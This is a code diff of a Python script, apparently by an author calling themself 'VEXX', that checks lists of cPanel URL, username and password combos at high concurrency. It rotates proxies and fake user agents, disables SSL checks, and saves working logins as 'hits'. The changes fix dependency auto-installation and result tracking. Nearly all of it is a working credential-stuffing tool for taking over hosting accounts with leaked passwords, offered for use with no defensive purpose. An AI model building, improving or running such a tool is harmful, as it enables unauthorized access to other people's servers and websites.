@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-cpanel_reliable_checker.py - MAX CONCURRENCY ASYNC for GitHub Actions (no features removed)
-Version: 3.0.0 - Asyncio + aiohttp, full speed
+cpanel_reliable_checker.py - MAX CONCURRENCY ASYNC for GitHub Actions (fixed auto-install)
+Version: 3.0.1 - Fixed dependency installation
 Author: VEXX
 """
 
@@ -17,50 +17,66 @@ import argparse
 import subprocess
 import importlib
 import asyncio
-import aiohttp
-import aiofiles
 from datetime import datetime
 from collections import defaultdict
 from concurrent.futures import ThreadPoolExecutor
 
-# -------------------- AUTO INSTALL DEPENDENCIES --------------------
-REQUIRED_PACKAGES = ['aiohttp', 'aiofiles', 'colorama', 'fake_useragent']
+# -------------------- AUTO INSTALL DEPENDENCIES (ROBUST) --------------------
+REQUIRED_PACKAGES = {
+    'aiohttp': 'aiohttp',
+    'aiofiles': 'aiofiles',
+    'colorama': 'colorama',
+    'fake_useragent': 'fake_useragent'
+}
 
-def install_package(package):
+def install_package(package_name):
+    """Install a Python package using pip with check=True."""
     try:
-        subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--quiet', package])
+        subprocess.run([sys.executable, '-m', 'pip', 'install', '--quiet', package_name],
+                       check=True, capture_output=True)
         return True
-    except subprocess.CalledProcessError:
+    except subprocess.CalledProcessError as e:
+        print(f"Failed to install {package_name}: {e.stderr.decode() if e.stderr else 'unknown error'}")
         return False
 
 def check_and_install():
+    """Check if required packages are installed, install if missing, then restart."""
     missing = []
-    for pkg in REQUIRED_PACKAGES:
-        pkg_import = pkg.replace('-', '_')
+    for pkg_name, import_name in REQUIRED_PACKAGES.items():
         try:
-            importlib.import_module(pkg_import)
+            importlib.import_module(import_name)
         except ImportError:
-            missing.append(pkg)
+            missing.append(pkg_name)
+    
     if missing:
         print(f"[*] Missing packages: {', '.join(missing)}. Installing...")
+        all_installed = True
         for pkg in missing:
             if install_package(pkg):
                 print(f"[+] Installed {pkg}")
             else:
-                print(f"[-] Failed to install {pkg}. Please install manually: pip install {pkg}")
-                sys.exit(1)
-        print("[*] All dependencies installed. Restarting script...")
-        os.execv(sys.executable, [sys.executable] + sys.argv)
+                print(f"[-] Failed to install {pkg}")
+                all_installed = False
+        
+        if all_installed:
+            print("[*] All dependencies installed. Restarting script...")
+            # Restart the script with the same arguments
+            os.execv(sys.executable, [sys.executable] + sys.argv)
+        else:
+            print("[!] Some packages could not be installed. Please install manually:")
+            print(f"    pip install {' '.join(missing)}")
+            sys.exit(1)
 
+# Run installation check BEFORE any external imports
 check_and_install()
 
-import requests  # still needed for extract_credentials only (sync)
-import urllib3
+# Now safe to import external modules
+import aiohttp
+import aiofiles
 from colorama import init, Fore, Style
 from fake_useragent import UserAgent
 
 init(autoreset=True)
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # -------------------- CONFIGURATION --------------------
 DEFAULT_TIMEOUT = 5
@@ -78,7 +94,7 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# -------------------- SYNC UTILITIES (kept for compatibility) --------------------
+# -------------------- SYNC UTILITIES (no network, safe) --------------------
 def load_proxies(proxy_file=PROXY_FILE):
     proxies = []
     if os.path.exists(proxy_file):
@@ -170,15 +186,13 @@ async def check_login(session, url, user, pwd, timeout, proxy=None):
         'Connection': 'keep-alive',
         'Referer': url
     }
-    proxy_auth = None
+    proxy_url = None
     if proxy:
-        # support http://user:pass@host:port
         proxy_url = proxy if proxy.startswith(('http://', 'https://')) else f'http://{proxy}'
-    else:
-        proxy_url = None
     
     try:
-        async with session.post(login_url, data=data, headers=headers, timeout=aiohttp.ClientTimeout(total=timeout), 
+        async with session.post(login_url, data=data, headers=headers, 
+                                timeout=aiohttp.ClientTimeout(total=timeout), 
                                 proxy=proxy_url, ssl=False) as resp:
             text = await resp.text()
             if resp.status == 200 and ('security_token' in text or 'cpsess' in text):
@@ -188,11 +202,13 @@ async def check_login(session, url, user, pwd, timeout, proxy=None):
         return False, None
 
 # -------------------- ASYNC WORKER WITH SEMAPHORE --------------------
-async def worker(sem, session, combo, timeout, proxy_list, results, hits_list, lock):
+async def worker(sem, session, combo, timeout, proxy_list, results, hits_list, lock, combo_index, all_combos):
     url, user, pwd = combo
     async with sem:
-        proxy = proxy_list[results['proxy_index'] % len(proxy_list)] if proxy_list else None
+        proxy = None
         if proxy_list:
+            idx = results['proxy_index'] % len(proxy_list)
+            proxy = proxy_list[idx]
             results['proxy_index'] += 1
         success, final_url = await check_login(session, url, user, pwd, timeout, proxy)
         async with lock:
@@ -202,7 +218,7 @@ async def worker(sem, session, combo, timeout, proxy_list, results, hits_list, l
             else:
                 results['fails'] += 1
             results['total_done'] += 1
-        return success, final_url, user, pwd
+        return success, final_url, user, pwd, combo_index
 
 # -------------------- DATABASE FUNCTIONS (sync, run in thread) --------------------
 def init_db_sync():
@@ -261,7 +277,8 @@ async def save_fail_async(url, user, executor):
 # -------------------- ASYNC MAIN RUNNER --------------------
 async def run_async(combos, concurrency, timeout, proxy_list):
     sem = asyncio.Semaphore(concurrency)
-    connector = aiohttp.TCPConnector(limit=concurrency, limit_per_host=concurrency, ssl=False, force_close=False)
+    connector = aiohttp.TCPConnector(limit=concurrency, limit_per_host=concurrency, 
+                                     ssl=False, force_close=False)
     async with aiohttp.ClientSession(connector=connector) as session:
         results = {
             'hits': 0,
@@ -272,23 +289,20 @@ async def run_async(combos, concurrency, timeout, proxy_list):
         hits_list = []
         lock = asyncio.Lock()
         tasks = []
-        for combo in combos:
-            tasks.append(asyncio.create_task(worker(sem, session, combo, timeout, proxy_list, results, hits_list, lock)))
+        for idx, combo in enumerate(combos):
+            tasks.append(asyncio.create_task(worker(sem, session, combo, timeout, proxy_list, 
+                                                     results, hits_list, lock, idx, combos)))
         
-        # Progress reporting
         total = len(combos)
         start_time = time.time()
-        last_report = 0
-        with ThreadPoolExecutor(max_workers=2) as executor:  # for DB writes
+        
+        with ThreadPoolExecutor(max_workers=2) as executor:
             for i, task in enumerate(asyncio.as_completed(tasks), 1):
-                success, final_url, user, pwd = await task
+                success, final_url, user, pwd, combo_idx = await task
                 if success:
-                    # we don't have response_time_ms in async version, can approximate
                     await save_hit_async(final_url, user, pwd, 0, executor)
                 else:
-                    # original_url is part of combo, but we don't have it here. We'll store from combo stored separately? 
-                    # We'll store fail with combo url (original)
-                    original_url = combos[i-1][0]  # careful: i-1 valid
+                    original_url = combos[combo_idx][0]
                     await save_fail_async(original_url, user, executor)
                 
                 if i % 50 == 0 or i == total:
@@ -305,8 +319,10 @@ async def run_async(combos, concurrency, timeout, proxy_list):
 def main():
     parser = argparse.ArgumentParser(description="cPanel Credential Checker - MAX CONCURRENCY ASYNC for GHA")
     parser.add_argument("-f", "--file", help="Input file containing combos (default: combo.txt)", default=COMBO_FILE)
-    parser.add_argument("-c", "--concurrency", type=int, default=DEFAULT_CONCURRENCY, help=f"Concurrent tasks (default: {DEFAULT_CONCURRENCY})")
-    parser.add_argument("-to", "--timeout", type=int, default=DEFAULT_TIMEOUT, help=f"Timeout in seconds (default: {DEFAULT_TIMEOUT})")
+    parser.add_argument("-c", "--concurrency", type=int, default=DEFAULT_CONCURRENCY, 
+                        help=f"Concurrent tasks (default: {DEFAULT_CONCURRENCY})")
+    parser.add_argument("-to", "--timeout", type=int, default=DEFAULT_TIMEOUT, 
+                        help=f"Timeout in seconds (default: {DEFAULT_TIMEOUT})")
     parser.add_argument("-p", "--proxy-file", help="File with proxies (default: proxies.txt)")
     parser.add_argument("--no-color", action="store_true", help="Disable colored output")
     parser.add_argument("--export-json", help="Export hits to JSON file")
@@ -344,7 +360,7 @@ def main():
         proxy_list = load_proxies(args.proxy_file)
         print(Fore.GREEN + f"[+] Loaded {len(proxy_list)} proxies.")
 
-    # Initialize database (sync)
+    # Initialize database
     init_db_sync()
     
     # Run async checker
@@ -355,7 +371,7 @@ def main():
         with open(HIT_FILE, 'w', encoding='utf-8') as f:
             f.writelines(hits_list)
         print(Fore.GREEN + f"\n[+] Hits: {hits} saved to {HIT_FILE}")
-        # Also display each hit in color (optional)
+        # Display each hit
         for line in hits_list:
             parts = line.strip().split('@')
             if len(parts) == 2:
